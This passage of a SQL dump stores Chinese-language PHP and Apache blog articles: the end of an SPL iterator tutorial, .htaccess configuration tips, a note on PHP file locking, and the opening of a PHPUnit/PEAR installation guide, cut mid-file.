  {&lt;br /&gt;\r\n    echo $e-&amp;gt;getMessage();&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;增加一个节点：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php &lt;br /&gt;\r\n $xmlstring = &amp;lt;&amp;lt;&amp;lt;XML&lt;br /&gt;\r\n&amp;lt;?xml version = &quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&amp;gt;&lt;br /&gt;\r\n&amp;lt;document&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;koala&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;kangaroo&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;wombat&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;wallaby&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;emu&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;kiwi&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;kookaburra&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;platypus&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;funnel web&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n&amp;lt;/document&amp;gt;&lt;br /&gt;\r\nXML;&lt;br /&gt;\r\n&lt;br /&gt;\r\ntry {&lt;br /&gt;\r\n    /*** a new simpleXML iterator object ***/&lt;br /&gt;\r\n    $sxi =  new SimpleXMLIterator($xmlstring);&lt;br /&gt;\r\n&lt;br /&gt;\r\n    /*** add a child ***/&lt;br /&gt;\r\n    $sxi-&amp;gt;addChild(''animal'', ''Tiger'');&lt;br /&gt;\r\n&lt;br /&gt;\r\n    /*** a new simpleXML iterator object ***/&lt;br /&gt;\r\n    $new = new SimpleXmlIterator($sxi-&amp;gt;saveXML());&lt;br /&gt;\r\n&lt;br /&gt;\r\n    /*** iterate over the new tree ***/&lt;br /&gt;\r\n    foreach($new as $val)&lt;br /&gt;\r\n        {&lt;br /&gt;\r\n        echo $val.''&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n        }&lt;br /&gt;\r\n    }&lt;br /&gt;\r\ncatch(Exception $e)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    echo $e-&amp;gt;getMessage();&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;增加属性：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php &lt;br /&gt;\r\n$xmlstring =&amp;lt;&amp;lt;&amp;lt;XML&lt;br /&gt;\r\n&amp;lt;?xml version = &quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&amp;gt;&lt;br /&gt;\r\n&amp;lt;document&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;koala&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;kangaroo&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;wombat&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;wallaby&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;emu&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;kiwi&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;kookaburra&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;platypus&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n  &amp;lt;animal&amp;gt;funnel web&amp;lt;/animal&amp;gt;&lt;br /&gt;\r\n&amp;lt;/document&amp;gt;&lt;br /&gt;\r\nXML;&lt;br /&gt;\r\n&lt;br /&gt;\r\ntry {&lt;br /&gt;\r\n    /*** a new simpleXML iterator object ***/&lt;br /&gt;\r\n    $sxi =  new SimpleXMLIterator($xmlstring);&lt;br /&gt;\r\n&lt;br /&gt;\r\n    /*** add an attribute with a namespace ***/&lt;br /&gt;\r\n    $sxi-&amp;gt;addAttribute(''id:att1'', ''good things'', ''urn::test-foo'');&lt;br /&gt;\r\n&lt;br /&gt;\r\n    /*** add an attribute without a  namespace ***/&lt;br /&gt;\r\n    $sxi-&amp;gt;addAttribute(''att2'', ''no-ns'');&lt;br /&gt;\r\n&lt;br /&gt;\r\n    echo htmlentities($sxi-&amp;gt;saveXML());&lt;br /&gt;\r\n    }&lt;br /&gt;\r\ncatch(Exception $e)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    echo $e-&amp;gt;getMessage();&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;&lt;strong&gt;16. CachingIterator类&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;这个类有一个hasNext()方法，用来判断是否还有下一个元素。&lt;/div&gt;\r\n&lt;div&gt;示例如下：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n/*** a simple array ***/&lt;br /&gt;\r\n$array = array(''koala'', ''kangaroo'', ''wombat'', ''wallaby'', ''emu'', ''kiwi'', ''kookaburra'', ''platypus'');&lt;br /&gt;\r\n&lt;br /&gt;\r\ntry {&lt;br /&gt;\r\n    /*** create a new object ***/&lt;br /&gt;\r\n    $object = new CachingIterator(new ArrayIterator($array));&lt;br /&gt;\r\n    foreach($object as $value)&lt;br /&gt;\r\n        {&lt;br /&gt;\r\n        echo $value;&lt;br /&gt;\r\n        if($object-&amp;gt;hasNext())&lt;br /&gt;\r\n            {&lt;br /&gt;\r\n            echo '','';&lt;br /&gt;\r\n            }&lt;br /&gt;\r\n        }&lt;br /&gt;\r\n    }&lt;br /&gt;\r\ncatch (Exception $e)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    echo $e-&amp;gt;getMessage();&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;&lt;strong&gt;17. LimitIterator类&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;这个类用来限定返回结果集的数量和位置，必须提供offset和limit两个参数，与SQL命令中limit语句类似。&lt;/div&gt;\r\n&lt;div&gt;示例如下：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n/*** the offset value ***/&lt;br /&gt;\r\n$offset = 3;&lt;br /&gt;\r\n&lt;br /&gt;\r\n/*** the limit of records to show ***/&lt;br /&gt;\r\n$limit = 2;&lt;br /&gt;\r\n&lt;br /&gt;\r\n$array = array(''koala'', ''kangaroo'', ''wombat'', ''wallaby'', ''emu'', ''kiwi'', ''kookaburra'', ''platypus'');&lt;br /&gt;\r\n&lt;br /&gt;\r\n$it = new LimitIterator(new ArrayIterator($array), $offset, $limit);&lt;br /&gt;\r\n&lt;br /&gt;\r\nforeach($it as $k=&amp;gt;$v)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    echo $it-&amp;gt;getPosition().''&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;另一个例子是：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n&lt;br /&gt;\r\n/*** a simple array ***/&lt;br /&gt;\r\n$array = array(''koala'', ''kangaroo'', ''wombat'', ''wallaby'', ''emu'', ''kiwi'', ''kookaburra'', ''platypus'');&lt;br /&gt;\r\n&lt;br /&gt;\r\n$it = new LimitIterator(new ArrayIterator($array));&lt;br /&gt;\r\n&lt;br /&gt;\r\ntry&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    $it-&amp;gt;seek(5);&lt;br /&gt;\r\n    echo $it-&amp;gt;current();&lt;br /&gt;\r\n    }&lt;br /&gt;\r\ncatch(OutOfBoundsException $e)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    echo $e-&amp;gt;getMessage() . &quot;&amp;lt;br /&amp;gt;&quot;;&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;&lt;strong&gt;18. SplFileObject类&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;这个类用来对文本文件进行遍历。&lt;/div&gt;\r\n&lt;div&gt;示例如下：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n&lt;br /&gt;\r\ntry{&lt;br /&gt;\r\n    // iterate directly over the object&lt;br /&gt;\r\n    foreach( new SplFileObject(&amp;amp;quot;/usr/local/apache/logs/access_log&amp;amp;quot;) as $line)&lt;br /&gt;\r\n    // and echo each line of the file&lt;br /&gt;\r\n    echo $line.''&amp;lt;br /&amp;gt;'';&lt;br /&gt;\r\n}&lt;br /&gt;\r\ncatch (Exception $e)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    echo $e-&amp;gt;getMessage();&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;返回文本文件的第三行，可以这样写：&lt;/div&gt;\r\n&lt;blockquote&gt;&lt;div&gt;&lt;pre&gt;&amp;lt;?php&lt;br /&gt;\r\n&lt;br /&gt;\r\ntry{&lt;br /&gt;\r\n    $file = new SplFileObject(&quot;/usr/local/apache/logs/access_log&quot;);&lt;br /&gt;\r\n&lt;br /&gt;\r\n    $file-&amp;gt;seek(3);&lt;br /&gt;\r\n&lt;br /&gt;\r\n    echo $file-&amp;gt;current();&lt;br /&gt;\r\n        }&lt;br /&gt;\r\ncatch (Exception $e)&lt;br /&gt;\r\n    {&lt;br /&gt;\r\n    echo $e-&amp;gt;getMessage();&lt;br /&gt;\r\n    }&lt;br /&gt;\r\n?&amp;gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;/div&gt;\r\n&lt;/blockquote&gt;\r\n&lt;div&gt;[参考文献]&lt;/div&gt;\r\n&lt;div&gt;1. &lt;a href=&quot;http://www.phpro.org/tutorials/Introduction-to-SPL.html&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#795b38&quot;&gt;Introduction to Standard PHP Library (SPL), By Kevin Waterson&lt;/font&gt;&lt;/a&gt;&lt;/div&gt;\r\n&lt;div&gt;2. &lt;a href=&quot;http://www.sitepoint.com/article/php5-standard-library&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#795b38&quot;&gt;Introducing PHP 5''s Standard Library, By Harry Fuecks&lt;/font&gt;&lt;/a&gt;&lt;/div&gt;\r\n&lt;div&gt;3.&lt;a href=&quot;http://devzone.zend.com/article/2565-The-Standard-PHP-Library-SPL&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#795b38&quot;&gt; The Standard PHP Library (SPL), By Ben Ramsey&lt;/font&gt;&lt;/a&gt;&lt;/div&gt;\r\n&lt;div&gt;4. &lt;a href=&quot;http://www.php.net/~helly/php/ext/spl/&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#795b38&quot;&gt;SPL - Standard PHP Library Documentation&lt;/font&gt;&lt;/a&gt;&lt;/div&gt;\r\n&lt;div&gt;&lt;br /&gt;\r\n&amp;nbsp;&lt;/div&gt;\r\n&lt;/div&gt;\r\n', 1, 1, 0, 0, 1302185245, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(30, 1, '.htaccess基本设置', '', '', '&lt;div class=&quot;showContent&quot;&gt;&lt;div&gt;.htaccess&amp;nbsp;文件 (Hypertext Access file) 是Apache Web服务器的一个非常强大的配置文件，对于这个文件，Apache有一堆参数可以让你配置出几乎随心所欲的功能。.htaccess 配置文件坚持了Unix的一个文化——使用一个ASCII 的纯文本文件来配置你的网站的访问策略。&lt;/div&gt;\r\n&lt;div&gt;这篇文章包括了16个非常有用的小技巧。另外，因为.htaccess 是一个相当强大的配置文件，所以，一个轻微的语法错误会造成你整个网站的故障，所以，在你修改或是替换原有的文件时，一定要备份旧的文件，以便出现问题的时候可以方便的恢复。&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;1. 使用.htaccess 创建自定义的出错页面。&lt;/strong&gt;对于Linux Apache来说这是一项极其简单的事情。使用下面的.htaccess语法你可以轻松的完成这一功能。（把.htaccess放在你的网站根目录下）&lt;/div&gt;\r\n&lt;div&gt;ErrorDocument 401 /error/401.php&lt;br /&gt;\r\nErrorDocument 403 /error/403.php&lt;br /&gt;\r\nErrorDocument 404 /error/404.php&lt;br /&gt;\r\nErrorDocument 500 /error/500.php&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;2. 设置网站的时区&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;SetEnv TZ America/Houston&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;3. 阻止IP列表&lt;/strong&gt;&lt;br /&gt;\r\n有些时候，你需要以IP地址的方式阻止一些访问。无论是对于一个IP地址还是一个网段，这都是一件非常简单的事情，如下所示：&lt;/div&gt;\r\n&lt;div&gt;allow from all&lt;br /&gt;\r\ndeny from 145.186.14.122&lt;br /&gt;\r\ndeny from 124.15&lt;/div&gt;\r\n&lt;div&gt;Apache对于被拒绝的IP会返回403错误。&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;4. 把一些老的链接转到新的链接上——搜索引擎优化SEO &lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;Redirect 301 /zhanz/20090614/56568.html http://www.kuqin.com/zhanz/20090614/56568.html&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;5. 为服务器管理员设置电子邮件。&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;ServerSignature EMail&lt;br /&gt;\r\nSetEnv SERVER_ADMIN default@domain.com&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;6. 使用.htaccess 访止盗链。&lt;/strong&gt;如果你网站上的一个图片被别的N多的网站引用了，那么，这很有可能会导致你服务器的性能下降，使用下面的代码可以保护某些热门的链接不被过多的引用。&lt;/div&gt;\r\n&lt;div&gt;Options +FollowSymlinks&lt;br /&gt;\r\n# Protect Hotlinking&lt;br /&gt;\r\nRewriteEngine On&lt;br /&gt;\r\nRewriteCond %{HTTP_REFERER} !^$&lt;br /&gt;\r\nRewriteCond %{HTTP_REFERER} !^http://(www.)?kuqin.com/ [nc]&lt;br /&gt;\r\nRewriteRule .*.(gif|jpg|png)$ http://kuqin.com/img/hotlink_f_o.png [nc]&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;7.&amp;nbsp;阻止 User Agent 的所有请求&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;## .htaccess Code :: BEGIN&lt;br /&gt;\r\n## Block Bad Bots by user-Agent&lt;br /&gt;\r\nSetEnvIfNoCase user-Agent ^FrontPage [NC,OR]&lt;br /&gt;\r\nSetEnvIfNoCase user-Agent ^Java.* [NC,OR]&lt;br /&gt;\r\nSetEnvIfNoCase user-Agent ^Microsoft.URL [NC,OR]&lt;br /&gt;\r\nSetEnvIfNoCase user-Agent ^MSFrontPage [NC,OR]&lt;br /&gt;\r\nSetEnvIfNoCase user-Agent ^Offline.Explorer [NC,OR]&lt;br /&gt;\r\nSetEnvIfNoCase user-Agent ^[Ww]eb[Bb]andit [NC,OR]&lt;br /&gt;\r\nSetEnvIfNoCase user-Agent ^Zeus [NC]&lt;/div&gt;\r\n&lt;div&gt;Order Allow,Deny&lt;br /&gt;\r\nAllow from all&lt;br /&gt;\r\nDeny from env=bad_bot&lt;/div&gt;\r\n&lt;div&gt;## .htaccess Code :: END&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;8. 把某些特殊的IP地址的请求重定向到别的站点&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;ErrorDocument 403 http://www.kuqin.com&lt;br /&gt;\r\nOrder deny,allow&lt;br /&gt;\r\nDeny from all&lt;br /&gt;\r\nAllow from 124.34.48.165&lt;br /&gt;\r\nAllow from 102.54.68.123&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;9.&amp;nbsp;直接找开文件而不是下载&lt;/strong&gt; – 通常，我们打开网上文件的时候总是会出现一个对话框问我们是下载还是直接打开，使用下面的设置就不会出现这个问题了，直接打开。&lt;/div&gt;\r\n&lt;div&gt;AddType application/octet-stream .pdf&lt;br /&gt;\r\nAddType application/octet-stream .zip&lt;br /&gt;\r\nAddType application/octet-stream .mov&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;10.&amp;nbsp;修改文件类型&lt;/strong&gt; – 下面的示例可以让任何的文件都成为PHP那么被服务器解释。比如：myphp, cgi，phtml等。&lt;/div&gt;\r\n&lt;div&gt;ForceType application/x-httpd-php&lt;br /&gt;\r\nSetHandler application/x-httpd-php&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;11. 阻止存取.htaccess 文件&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;# secure htaccess file&lt;/div&gt;\r\n&lt;div&gt;&amp;nbsp;order allow,deny&lt;br /&gt;\r\n&amp;nbsp;deny from all&lt;br /&gt;\r\n&lt;strong&gt;12. 保护服务器上的文件被存取&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;# prevent access of a certain file order allow,deny&lt;br /&gt;\r\n&amp;nbsp;deny from all&lt;br /&gt;\r\n&lt;strong&gt;13.&amp;nbsp;阻止目录浏览&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;# disable directory browsing&lt;br /&gt;\r\nOptions All -Indexes&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;14. 设置默认主页&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;# serve alternate default index page&lt;br /&gt;\r\nDirectoryIndex about.html&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;15.&amp;nbsp;口令认证&lt;/strong&gt; – 你可以创建一个文件用于认证。下面是一个示例：&lt;/div&gt;\r\n&lt;div&gt;# to protect a file&lt;/div&gt;\r\n&lt;div&gt;AuthType Basic&lt;br /&gt;\r\nAuthName “Prompt”&lt;br /&gt;\r\nAuthUserFile /home/path/.htpasswd&lt;br /&gt;\r\nRequire valid-user&lt;/div&gt;\r\n&lt;div&gt;# password-protect a directory&lt;br /&gt;\r\nresides&lt;br /&gt;\r\nAuthType basic&lt;br /&gt;\r\nAuthName “This directory is protected”&lt;br /&gt;\r\nAuthUserFile /home/path/.htpasswd&lt;br /&gt;\r\nAuthGroupFile /dev/null&lt;br /&gt;\r\nRequire valid-user&lt;/div&gt;\r\n&lt;div&gt;&lt;strong&gt;16. 把老的域名转像新的域名&lt;/strong&gt;&lt;/div&gt;\r\n&lt;div&gt;# redirect from old domain to new domain&lt;br /&gt;\r\nRewriteEngine On&lt;br /&gt;\r\nRewriteRule ^(.*)$ http://www.kuqin.com/$1 [R=301,L]&lt;/div&gt;\r\n&lt;/div&gt;\r\n', 1, 1, 0, 0, 1302185322, 1, 'admin'),
(31, 1, 'PHP文件锁的使用方法', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-size:14px;line-height:20px;&quot;&gt;&amp;nbsp;&lt;div style=&quot;padding-right:0px;padding-left:0px;padding-bottom:0px;margin:0px;line-height:30px;padding-top:0px;&quot;&gt;&lt;span style=&quot;color:#006699;&quot;&gt;&lt;span style=&quot;color:#000000;&quot;&gt;文件锁有两种：共享锁和排他锁，也就是读锁(LOCK_SH)和写锁(LOCK_EX)&amp;nbsp;&lt;br /&gt;\r\n文件的锁一般这么使用：&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;\r\n&lt;div class=&quot;dp-highlighter&quot; style=&quot;padding-right:0px;padding-left:0px;padding-bottom:0px;margin:0px;padding-top:0px;&quot;&gt;&lt;ol class=&quot;dp-j&quot; style=&quot;padding-right:0px;padding-left:0px;padding-bottom:0px;margin:0px;padding-top:0px;list-style-type:none;&quot;&gt;&lt;li style=&quot;padding-right:0px;padding-left:0px;padding-bottom:0px;margin:0px;padding-top:0px;&quot;&gt;&lt;span&gt;&lt;span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;$fp&amp;nbsp;=&amp;nbsp;fopen(&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&lt;span style=&quot;color:#0000ff;&quot;&gt;&quot;filename&quot;&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&lt;span style=&quot;color:#0000ff;&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;); &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; &lt;li style=&quot;padding-right:0px;padding-left:0px;padding-bottom:0px;margin:0px;padding-top:0px;&quot;&gt;&lt;span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;flock($fp,&amp;nbsp;LOCK_SH)&amp;nbsp;or&amp;nbsp;die(&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;&lt;span style=&quot;color:#0000ff;&quot;&gt;&quot;lock&amp;nbsp;error&quot;&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;) &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt; &lt;li style=&quot;padding-right:0px;padding-left:0px;padding-bottom:0px;margin:0px;padding-top:0px;&quot;&gt;&lt;span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;$str&amp;nbsp;=&amp;nbsp;fread($fp,&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;&lt;span style=&quot;color:#c00000;&quot;&gt;1024&lt;/span&gt;&lt;/span&gt;&lt;span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;); &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt; &lt;li style=&quot;padding-right:0px;padding-left:0px;padding-bottom:0px;margin:0px;padding-top:0px;&quot;&gt;&lt;span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;flock($fp,&amp;nbsp;LOCK_UN); &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt; &lt;li style=&quot;padding-right:0px;padding-left:0px;padding-bottom:0px;margin:0px;padding-top:0px;&quot;&gt;&lt;span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;fclose($fp); &amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;/ol&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n&lt;strong&gt;注意fwrite之后，文件立即就被更新了，而不是等fwrite然后fclose之后文件才会更新，这个可以通过在fwrite之后fclose之前读取这个文件进行检查&lt;/strong&gt;&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n但是什么时候使用lock_ex什么时候使用lock_sh呢？&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;span style=&quot;color:red;&quot;&gt;&lt;strong&gt;读的时候：&lt;/strong&gt;&lt;/span&gt;&amp;nbsp;&lt;br /&gt;\r\n如果不想出现dirty数据，那么最好使用lock_sh共享锁。可以考虑以下三种情况：&amp;nbsp;&lt;br /&gt;\r\n1. 如果读的时候没有加共享锁，那么其他程序要写的话（不管这个写是加锁还是不加锁）都会立即写成功。如果正好读了一半，然后被其他程序给写了，那么读的后一半就有可能跟前一半对不上（前一半是修改前的，后一半是修改后的）&amp;nbsp;&lt;br /&gt;\r\n2. 如果读的时候加上了共享锁（因为只是读，没有必要使用排他锁），这个时候，其他程序开始写，这个写程序没有使用锁，那么写程序会直接修改这个文件，也会导致前面一样的问题&amp;nbsp;&lt;br /&gt;\r\n3. 最理想的情况是，读的时候加锁(lock_sh),写的时候也进行加锁(lock_ex),这样写程序会等着读程序完成之后才进行操作，而不会出现贸然操作的情况&amp;nbsp;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;span style=&quot;color:red;&quot;&gt;&lt;strong&gt;写的时候：&lt;/strong&gt;&lt;/span&gt;&amp;nbsp;&lt;br /&gt;\r\n如果多个写程序不加锁同时对文件进行操作，那么最后的数据有可能一部分是a程序写的，一部分是b程序写的&amp;nbsp;&lt;br /&gt;\r\n如果写的时候加锁了，这个时候有其他的程序来读，那么他会读到什么东西呢？&amp;nbsp;&lt;br /&gt;\r\n1. 如果读程序没有申请共享锁，那么他会读到dirty的数据。比如写程序要写a,b,c三部分，写完a,这时候读读到的是a，继续写b，这时候读读到的是ab，然后写c，这时候读到的是abc.&amp;nbsp;&lt;br /&gt;\r\n2. 如果读程序在之前申请了共享锁，那么读程序会等写程序将abc写完并释放锁之后才进行读。&amp;nbsp;&lt;/span&gt;&lt;font size=&quot;3&quot;&gt; &lt;/font&gt;', 1, 1, 0, 0, 1302186454, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(32, 1, 'PHP单元测试（PHPUnit）的相关例子和说明', '', '', '&lt;div class=&quot;CopyrightStatement lh22&quot;&gt;原创作品，允许转载，转载时请务必以超链接形式标明文章 &lt;a style=&quot;text-decoration:underline;&quot; href=&quot;http://itwatch.blog.51cto.com/1338142/391446&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#015f91&quot;&gt;原始出处&lt;/font&gt;&lt;/a&gt; 、作者信息和本声明。否则将追究法律责任。&lt;a href=&quot;http://itwatch.blog.51cto.com/1338142/391446&quot;&gt;&lt;font color=&quot;#015f91&quot;&gt;http://itwatch.blog.51cto.com/1338142/391446&lt;/font&gt;&lt;/a&gt; &lt;/div&gt;\r\n&lt;!--正文 begin--&gt;&lt;div class=&quot;showContent&quot;&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 一个函数、一个类编写完成，到底能不能正确工作？怎么测试它？PHP 单元测试是个好办法，它提供了自动化测试的方法，使敏捷开发的自动化测试成为可能。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 在 PHP 下进行单元测试，需要用到 PHP 单元测试的一个框架。这个单元测试框架随 PEAR 即 PHP 扩展库一起分发。所以需要首先安装 Pear 的 PHP 单元测试扩展库。安装是通过网络从有关的站点实时安装的，所以安装的机器必须连接到互联网上。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 一、安装 PEAR&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 但从 PHP5.2 版本开始，在 Windows 下安装 PEAR 就有一些问题，直到 PHP5.3，问题依然存在。比如，在 Zend Server Community Edition 5.0.1(包含 PHP5.3.2)下，安装 PEAR，点击运行 ~\\Zend\\ZendServer\\bin\\go-pear.bat 批处理文件，会报错：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; “……~\\Zend\\ZendServer\\bin\\PEAR\\go-pear.phar does not have a signature”&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 通过查找资料，修改 go-pear.bat 的第三条语句&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; %PHP_BIN% -d output_buffering=0 PEAR\\go-pear.phar，为&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; %PHP_BIN% -d phar.require_hash=0 PEAR\\go-pear.phar&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 才会开始安装 PEAR。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 修改后的 go-pear.bat 文件内容：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; @ECHO OFF&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; set PHP_BIN=php.exe&lt;br /&gt;\r\n&amp;nbsp;&amp;nbsp;&amp;nbsp; rem %PHP_BIN% -d output_buffering=0 PEAR\\go-pear.phar&lt;br 